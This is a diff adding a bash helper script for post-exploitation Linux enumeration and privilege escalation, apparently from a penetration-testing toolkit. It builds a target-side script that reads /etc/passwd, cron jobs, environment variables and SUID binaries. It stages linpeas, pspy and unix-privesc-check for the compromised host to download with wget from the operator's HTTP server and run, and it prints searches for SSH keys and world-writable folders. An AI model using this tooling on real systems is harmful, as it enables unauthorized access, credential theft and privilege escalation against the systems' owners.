@@ -1,0 +1,79 @@
+#!/bin/bash
+SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
+source $SCRIPTDIR/general.sh
+
+linux_enumeration_auto() {
+    echo 'Linux Manual Enumeration'
+    echo "wget http://$http_ip:$http_port/linux_auto.sh"
+    echo '#!/bin/bash' > linux_auto.sh
+    echo 'id' >> linux_auto.sh
+    echo 'cat /etc/passwd' >> linux_auto.sh
+    echo 'hostname' >> linux_auto.sh
+    echo 'cat /etc/issue' >> linux_auto.sh
+    echo 'uname -a' >> linux_auto.sh
+    echo 'ps aux' >> linux_auto.sh
+    echo 'ip a' >> linux_auto.sh
+    echo 'routel' >> linux_auto.sh
+    echo 'ss -anp' >> linux_auto.sh
+    echo 'cat /etc/iptables/rules.v4' >> linux_auto.sh
+    echo 'ls -lah /etc/cron*' >> linux_auto.sh
+    echo 'crontab -l' >> linux_auto.sh
+    echo 'sudo crontab -l' >>  linux_auto.sh
+    echo 'dpkg -l' >> linux_auto.sh
+    echo 'find / -writable -type d 2>/dev/null' >> linux_auto.sh
+    echo 'cat /etc/fstab' >> linux_auto.sh
+    echo 'mount' >> linux_auto.sh
+    echo 'lsblk' >> linux_auto.sh
+    echo 'lsmod' >> linux_auto.sh
+    echo '/sbin/modinfo libata' >> linux_auto.sh
+    echo 'find / -perm -u=s -type f 2>/dev/null' >> linux_auto.sh
+    echo 'Linux Automatic Enumeration' 
+    echo 'echo "Look at user trails"' >> linux_auto.sh
+    echo 'env' >> linux_auto.sh
+    echo 'cat ~/.bashrc' >> linux_auto.sh
+    echo 'Linux Automatic Enumeration'
+    echo "wget http://$http_ip:$http_port/unix_privesc_check.sh" >> linux_auto.sh
+    echo unix_privesc_check standard >> linux_auto.sh
+}
+
+download_linpeas() {
+    if [ ! -f "linpeas.sh" ]; then
+        linpeas_link=$(curl -s https://github.com/peass-ng/PEASS-ng/releases | grep linpeas.sh | grep -oP 'href="\K[^"]+')
+        wget https://github.com$linpeas_link
+    fi
+    echo "wget http://$http_ip:$http_port/linpeas.sh -O linpeas.sh"
+}
+
+run_linpeas() {
+    download_linpeas
+    echo 'chmod +x linpeas.sh'
+    echo './linpeas.sh'
+}
+
+get_unix_privesc_check() {
+    cp /usr/share/unix-privesc-check/unix-privesc-check .
+    generate_linux_download unix-privesc-check
+}
+
+check_ssh_keys() {
+    echo 'find / -regex ".*\.ssh.*" 2>/dev/null'
+}
+
+check_text_files() {
+    echo 'find / -type f -name "*.txt" 2>/dev/null'
+}
+
+find_folders_with_write_permissions() {
+    echo 'find . -type d -perm -002 -print 2>/dev/null'
+}
+
+
+get_pspy() {
+    local url='https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64'
+    if [[ -f "pspy64" ]]; then
+        echo "pspy64 already exists, skipping download."
+    else
+        wget "$url" -O pspy64
+    fi
+    generate_linux_download "pspy64"
+}
